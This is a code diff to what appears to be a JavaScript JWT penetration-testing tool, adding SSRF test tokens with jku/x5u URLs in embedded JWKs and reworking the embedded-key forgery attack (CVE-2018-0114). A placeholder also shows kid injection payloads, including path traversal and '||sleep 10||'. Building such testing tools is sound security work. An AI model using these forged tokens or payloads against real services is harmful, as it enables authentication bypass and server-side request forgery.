@@ -98,13 +98,13 @@ const vulnerabilities = {
         name: 'Server-Side Request Forgery (SSRF)',
         cve: 'N/A',
         description: 'Test the jku/x5u header for SSRF vulnerability. If the server implement this feature without validating the URL, an attacker can exploit SSRF.',
-        token_amount: 4
+        token_amount: 6
     },
     CustomKey: {
         name: "Custom Key Attack / Public Key Injection via embedded JWK",
         cve: "CVE-2018-0114",
-        description: "Abuses JWT implementations that accept and trust an embedded 'jwk' object directly in the JWT header. An attacker can generate their own key pair, embed the public key in the 'jwk' field, and sign the token with the corresponding private key, or leave the key empty to use the hardcoded keys.",
-        token_amount: 1
+        description: "Abuses JWT implementations that accept and trust an embedded 'jwk' object directly in the JWT header. It generates four tokens for each algorithm type with an hardcoded key. An attacker can also generate their own key and submit it via the JWK field. ",
+        token_amount: 4
     },
     KeyConfusion: {
         name: "Key Confusion / Algorithm Confusion Attack (RSA/EC Public Key used as HMAC key)",
@@ -2510,13 +2510,13 @@ async function generateVulnerableTokens() {
                 }
                 break;
             case 'CustomKey':
-                if (document.getElementById("testCustomKeyViaURL").checked) {
-                    if (!document.getElementById("CustomKeyURL").value) {
-                        jwt_attacks_error_message("Please enter a URL for Custom Key attack");
-                        document.querySelector('#vuln-CustomKey ~ div span.vulnerability-name').classList.add('vulnerability-with-error-message');
-                        return [];
-                    }
-                    else if (!document.getElementById("CustomKey").value) {
+                if (document.getElementById("testCustomKeyViaUserInput").checked) {
+                    // if (!document.getElementById("CustomKeyURL").value) {
+                    //     jwt_attacks_error_message("Please enter a URL for Custom Key attack");
+                    //     document.querySelector('#vuln-CustomKey ~ div span.vulnerability-name').classList.add('vulnerability-with-error-message');
+                    //     return [];
+                    // }
+                    if (!document.getElementById("CustomKey").value) {
                         jwt_attacks_error_message("Please enter a Key (JWK) for Custom Key attack");
                         document.querySelector('#vuln-CustomKey ~ div span.vulnerability-name').classList.add('vulnerability-with-error-message');
                         return [];
@@ -2550,16 +2550,18 @@ async function generateVulnerableTokens() {
                 results.push(attackPsychicSignature(jwt))
                 break
             case 'CustomKey':
-                let algsToBeTested = [document.getElementById("customKeyAlg").value];
-                if (document.getElementById("testAllCustomKeyAlgs").checked) {
-                    // If the user wants to test all algorithms with the custom key
-                    // algsToBeTested = ['HS256', 'HS384', 'HS512', 'RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512', 'PS256', 'PS384', 'PS512'];
-                    algsToBeTested = ['HS256', 'RS256', 'ES256', 'PS256'] // this should be enough, right?
+                // algsToBeTested = ['HS256', 'HS384', 'HS512', 'RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512', 'PS256', 'PS384', 'PS512'];
+                algsToBeTested = ['HS256', 'RS256', 'ES256', 'PS256'] // this should be enough, right?
+                if (document.getElementById("testCustomKeyViaUserInput").checked){
+                    if (document.getElementById("CustomKeyURL").value) { // if URL is set, test embedded key via jku/x5u
+                        results.push(...await attackCustomKey(jwt, document.getElementById("CustomKeyAlg").value, document.getElementById("CustomKey").value, true, document.getElementById("CustomKeyURL").value, true))
+                    }
+                    else { // if no URL is set, test embedded key only
+                        results.push(...await attackCustomKey(jwt, document.getElementById("CustomKeyAlg").value, document.getElementById("CustomKey").value, false, "", true))
+                    } 
                 }
-                let testCustomKeyViaURL = document.getElementById("testCustomKeyViaURL").checked;
                 for (const alg of algsToBeTested) {
-                    results.push(...await attackCustomKey(jwt, alg, document.getElementById("CustomKey").value, testCustomKeyViaURL, document.getElementById("CustomKeyURL").value, true))
-                    testCustomKeyViaURL = false;
+                    results.push(...await attackCustomKey(jwt, alg, document.getElementById("CustomKey").value, false, "", true))
                 }
                 break
             case 'KeyConfusion':
@@ -3215,12 +3217,12 @@ function attack_SSRF(token, url = "http://localhost:8080", isCalledFromCustomKey
     // I still leave the default value in the function parameter, since it is more readable
     url = url ? url : "http://localhost:8080";
 
-    //* 4 Testcases: x5u/jku in header and x5u/jku in extra jwk in header
+    //* 6 Testcases: x5u/jku in header; x5u/jku in extra jwk in header with RS key parameters; and x5u/jku in extra jwk in header without rsa key parameters 
     // token generation is straight forward, just add jku/x5u = url to the header
     //1. jku in header
     let header_jku = JSON.parse(JSON.stringify(header_json_org)); // apparently a deep copy
     header_jku.jku = url;
-
+    header_jku.jwk = undefined; // to avoid duplicates
     // remove ESCAPE_SEQUENCE from the header
     let header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_jku), isCalledFromCustomKey)
 
@@ -3237,6 +3239,7 @@ function attack_SSRF(token, url = "http://localhost:8080", isCalledFromCustomKey
     // 2. x5u in header
     let header_x5u = JSON.parse(JSON.stringify(header_json_org)); // apparently a deep copy
     header_x5u.x5u = url;
+    header_x5u.jwk = undefined; // to avoid duplicates
 
     // remove ESCAPE_SEQUENCE from the header
     header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_x5u), isCalledFromCustomKey)
@@ -3291,6 +3294,46 @@ function attack_SSRF(token, url = "http://localhost:8080", isCalledFromCustomKey
     test_cases.push(new TestCase({
         description: "Test for SSRF via unvalidated jku in JWK in JWT header",
         variantName: 'JWK(jku) - kty: RSA',
+        originalToken: token,
+        testToken: `${b64URLencode(header_with_duplicates)}.${body}.${signature}`,
+        originalReadable: header_json_org,
+        testReadable: header_with_duplicates,
+        vulnerability: vulnerabilities.SSRF
+    }))
+    
+    // 5. x5u in jwk without rsa key parameters
+    let header_x5u_jwk_without_keymaterial = JSON.parse(JSON.stringify(header_json_org)); // apparently a deep copy
+    header_x5u_jwk_without_keymaterial.jwk = {
+        kty: "RSA",
+        x5u: url
+    }
+
+    // remove ESCAPE_SEQUENCE from the header
+    header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_x5u_jwk_without_keymaterial), isCalledFromCustomKey)
+
+    test_cases.push(new TestCase({
+        description: "Test for SSRF via unvalidated x5u in JWK in JWT header",
+        variantName: 'JWK(x5u) - kty: RSA without key parameters',
+        originalToken: token,
+        testToken: `${b64URLencode(header_with_duplicates)}.${body}.${signature}`,
+        originalReadable: header_json_org,
+        testReadable: header_with_duplicates,
+        vulnerability: vulnerabilities.SSRF
+    }))
+
+    // 6. jku in jwk without rsa key parameters
+    let header_jku_jwk_without_keymaterial = JSON.parse(JSON.stringify(header_json_org)); // apparently a deep copy
+    header_jku_jwk_without_keymaterial.jwk = {
+        kty: "RSA",
+        jku: url
+    }
+
+    // remove ESCAPE_SEQUENCE from the header
+    header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_jku_jwk_without_keymaterial), isCalledFromCustomKey)
+
+    test_cases.push(new TestCase({
+        description: "Test for SSRF via unvalidated jku in JWK in JWT header",
+        variantName: 'JWK(jku) - kty: RSA without key parameters',
         originalToken: token,
         testToken: `${b64URLencode(header_with_duplicates)}.${body}.${signature}`,
         originalReadable: header_json_org,
@@ -4065,6 +4108,31 @@ function calculateTotalTokenAmount() {
     });
     document.getElementById('generate-btn').innerText = "Generate Vulnerable Tokens (" + totalTokens + ")";
 }
+
+function updateCustomKeyTokenCount(){
+    const checkbox = document.getElementById("testCustomKeyViaUserInput");
+    const keyInput = document.getElementById("CustomKey");
+    const urlInput = document.getElementById("CustomKeyURL");
+    const vulnerabilityWrapper = checkbox.closest('.vulnerability-checkbox-wrapper');
+    const parentThatDisplaysTokenAmount = vulnerabilityWrapper.querySelector(".vulnerability-name");
+    const parentWithTokenAmount = vulnerabilityWrapper.querySelector(".vulnerability-checkbox");
+    
+    if (checkbox.checked){
+        if (keyInput.value){
+            parentWithTokenAmount.setAttribute('data-token-amount-parent', 5);
+            if (urlInput.value){
+                parentWithTokenAmount.setAttribute('data-token-amount-parent', 11);
+            }
+        }
+    }
+
+    const currentText = parentThatDisplaysTokenAmount.innerText;
+    const newText = currentText.replace(/\(\d+\)/, `(${parentWithTokenAmount.getAttribute('data-token-amount-parent')})`);
+    parentThatDisplaysTokenAmount.innerText = newText;
+    calculateTotalTokenAmount();
+}
+
+
 function updateKidTokenCount(textarea) {
     const checkbox = textarea.previousElementSibling;
     const oldValue = Number(textarea.dataset.lastCount || 0);
@@ -4159,10 +4227,7 @@ function initVulnerabilitiesList() {
                 <div class="vulnerability-details">${vuln.description}</div>
                 <div class="vulnerability-cve"> <span>${vuln.cve !== 'N/A' ? `${vuln.cve}` : ''}</span></div>
                 ${key === 'KeyConfusion' ? '<input type="text" id="KeyConfusionKey" placeholder="Enter Pulbic Key (JWK or PEM)" />' : ''}
-                ${key === 'CustomKey' ? '<input type="text" id="CustomKey" placeholder="Enter Private Key (JWK)" />' : ''}
-                ${key === 'CustomKey' ? '<select id="customKeyAlg"><option value="HS256">HS256</option><option value="RS256">RS256</option><option value="ES256">ES256</option><option value="PS256">PS256</option></select>' : ''}
-                ${key === 'CustomKey' ? '<div class="inline-checkbox"><input type="checkbox" class="inline-checkbox" onchange="change_token_amount_of_parent(this)" id="testAllCustomKeyAlgs" data-token-amount-child="3"/><label for="testAllCustomKeyAlgs">Test all algorithms? (+3) </label></div>' : ''}
-                ${key === 'CustomKey' ? '<div class="inline-checkbox"><input type="checkbox" onchange="change_token_amount_of_parent(this)" id="testCustomKeyViaURL" data-token-amount-child="4"/><input type="text" id="CustomKeyURL" placeholder="jku/x5u URL for JWK" /></div>' : ''}
+                ${key === 'CustomKey' ? '<div class="inline-checkbox"><input type="checkbox" onchange="toggleCustomKeyAttackDropdown(this);change_token_amount_of_parent(this)" id="testCustomKeyViaUserInput" data-token-amount-child="1"/><select disabled class="select" id="CustomKeyAlg"><option value="HS256">HS256</option><option value="RS256">RS256</option><option value="ES256">ES256</option><option value="PS256">PS256</option></select><input type="text" id="CustomKey" oninput="updateCustomKeyTokenCount(this)" placeholder="Enter Private Key (JWK)" /><input type="text" id="CustomKeyURL" oninput="updateCustomKeyTokenCount(this)" placeholder="jku/x5u URL for JWK" /></div>' : ''}
                 ${key === 'SSRF' ? '<input type="text" id="SSRFURL" placeholder="http://localhost:8080" />' : ''}
                 ${key === 'Kid' ? '<div class="inline-checkbox"><input type="checkbox" onchange="change_token_amount_of_parent(this)" class="inline-checkbox" data-token-amount-child="0" id="useKidCustomPayloadList"/><textarea id="kidCustomPayloadList" rows="4" onchange="updateKidTokenCount(this)" placeholder="kid_payload;[expected_key(Base64)]&#10;foo;bar&#10;../../../dev/null;\\0&#10;||sleep 10||"></textarea></div>' : ''}
                 </div>
@@ -4183,11 +4248,12 @@ function initVulnerabilitiesList() {
                 }
             }
         });
+        toggleCustomKeyAttackDropdown(document.getElementById("testCustomKeyViaUserInput")); // Ensure the dropdown gets disabled/enabled correctly
         calculateTotalTokenAmount();
     });
     document.getElementById('select-all-without-user-interaction-checkbox').addEventListener('change', function () {
         const isChecked = this.checked;
-        const idsToSkip = ["useKidCustomPayloadList", "vuln-KeyConfusion", "testCustomKeyViaURL", "vuln-SSRF"];
+        const idsToSkip = ["useKidCustomPayloadList", "vuln-KeyConfusion", "testCustomKeyViaUserInput", "vuln-SSRF"];
         document.getElementById('select-all-checkbox').checked = false;
         document.querySelectorAll('#vulnerabilities-list input[type="checkbox"]').forEach(checkbox => {
             if (idsToSkip.includes(checkbox.id)) {
@@ -4355,6 +4421,16 @@ function renderTestCasesToTable(testCases, containerId = 'resultTableBody') {
         `;
         tbody.appendChild(row);
     });
+}
+
+/**
+ * Enables or disables the custom key algorithm dropdown based on the state of the checkbox.
+ *
+ * @param {HTMLInputElement} checkbox
+ */
+function toggleCustomKeyAttackDropdown(checkbox) {
+    const dropdownElement = document.getElementById('CustomKeyAlg');
+    dropdownElement.disabled = !checkbox.checked;
 }
 // #endregion ====================== End of Table and UI Functions
 
